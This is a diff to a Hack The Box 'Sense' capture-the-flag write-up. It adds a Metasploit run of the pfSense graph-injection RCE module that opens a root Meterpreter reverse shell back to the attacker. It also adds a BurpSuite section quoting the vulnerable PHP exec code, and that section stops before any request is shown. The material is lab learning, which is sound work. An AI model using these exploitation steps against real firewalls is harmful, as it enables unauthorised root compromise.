@@ -1,3 +1,7 @@
+# References
+1. [Sense Writeup (v3ded.github.io)](https://v3ded.github.io/ctf/htb-sense)
+2. [Sense Video (IppSec youtube.com)](https://www.youtube.com/watch?v=d2nVDoVr0jE&ab_channel=IppSec)
+
 # Summary
 ### 1. NMAP
 x
@@ -12,6 +16,9 @@ x
 x
 
 ### 5. Alternative Port 443 Command Injection Exploit (Metasploit)
+x
+
+### 6. Alternative Port 443 Command Injection Exploit (BurpSuite)
 x
 
 # Attack
@@ -537,4 +544,97 @@ d08c32a5d4f8c8b10e76eb51a69f1a86
 We got both user and root flags without the need of any privilege escalation!
 
 ## 5. Alternative Port 443 Command Injection Exploit (Metasploit)
-Apparently, there is a Metasploit module written for this `pfSense 2.1.3-RELEASE`.
+Apparently, there is a Metasploit module written for this `pfSense 2.1.3-RELEASE`. Doing a Google search, we see a result of the [Metasploit module](https://www.rapid7.com/db/modules/exploit/unix/http/pfsense_graph_injection_exec/).
+
+We also do a search on Metasploit.
+```
+hippoeug@kali:~$ msfconsole
+msf6 > search pfsense
+
+Matching Modules
+================
+
+   #  Name                                            Disclosure Date  Rank       Check  Description
+   -  ----                                            ---------------  ----       -----  -----------
+   0  exploit/unix/http/pfsense_clickjacking          2017-11-21       normal     No     Clickjacking Vulnerability In CSRF Error Page pfSense
+   1  exploit/unix/http/pfsense_graph_injection_exec  2016-04-18       excellent  No     pfSense authenticated graph status RCE
+   2  exploit/unix/http/pfsense_group_member_exec     2017-11-06       excellent  Yes    pfSense authenticated group member RCE
+```
+We see the same Metasploit module `exploit/unix/http/pfsense_graph_injection_exec`, so let's use it.
+```
+msf6 > use exploit/unix/http/pfsense_graph_injection_exec
+[*] Using configured payload php/meterpreter/reverse_tcp
+msf6 exploit(unix/http/pfsense_graph_injection_exec) > show options
+
+Module options (exploit/unix/http/pfsense_graph_injection_exec):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD  pfsense          yes       Password to login with
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT     443              yes       The target port (TCP)
+   SSL       true             no        Negotiate SSL/TLS for outgoing connections
+   USERNAME  admin            yes       User to login with
+   VHOST                      no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf6 exploit(unix/http/pfsense_graph_injection_exec) > set rhost 10.129.85.110
+rhost => 10.129.85.110
+msf6 exploit(unix/http/pfsense_graph_injection_exec) > set username rohit
+username => rohit
+msf6 exploit(unix/http/pfsense_graph_injection_exec) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf6 exploit(unix/http/pfsense_graph_injection_exec) > exploit
+
+[*] Started reverse TCP handler on 10.10.x.x:4444 
+[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload
+[*] Payload uploaded successfully, executing
+[*] Sending stage (39282 bytes) to 10.129.85.110
+[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.129.85.110:48852) at 2021-05-12 06:12:39 +0800
+[+] Deleted fBpI
+
+meterpreter > getuid
+Server username: root (0)
+```
+Meterpreter shell with root privileges.
+
+## 6. Alternative Port 443 Command Injection Exploit (BurpSuite)
+While doing a Google search for `pfSense 2.1.3-RELEASE` exploits, we come across a [Source](https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/) that details the pfSense authenticated graph status RCE.
+
+Quoting one of the sources: "pfSense, a free BSD based open source firewall distribution, versions 2.2.6 and below contain a remote command execution vulnerability post authentication in the `\_rrd_graph_img.php` page. The vulnerability occurs via the graph GET parameter. A non-administrative authenticated attacker can inject arbitrary operating system commands and execute them as the root user. Verified against 2.1.3.".
+
+In [IppSec's video](https://www.youtube.com/watch?v=d2nVDoVr0jE&ab_channel=IppSec), he goes through this exploit in detail too.
+
+In short, there is a GET request to `$curdatabase`, and later on in the pfSense code, this variable will be executed. Here is where the command execution is exploited.
+```
+if ($_GET['database']) {
+	$curdatabase = basename($_GET['database']);
+} 
+else {
+	$curdatabase = "wan-traffic.rrd";
+}
+...
+if(strstr($curdatabase, "queues")) {
+	...
+	exec("/bin/rm -f $rrddbpath$curdatabase");
+	Flush();
+	Usleep(500);
+	enable_rrd_graphing();
+}
+```
